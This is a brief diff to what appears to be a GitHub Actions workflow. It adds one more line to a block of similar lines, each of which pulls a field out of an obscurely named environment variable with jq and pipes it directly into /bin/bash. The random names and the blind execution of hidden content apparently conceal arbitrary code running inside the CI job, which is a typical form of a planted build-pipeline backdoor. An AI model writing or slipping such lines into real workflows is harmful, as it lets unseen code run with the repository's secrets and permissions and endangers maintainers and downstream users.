@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$fm9724" | jq -r .rybzz2033 | /bin/bash
           echo $fzgx397 | jq -r .flz5 | /bin/bash
           echo $hi40058 | jq -r .cvt1 | /bin/bash
+          printf '%s' "$uz5" | jq -r .de97 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
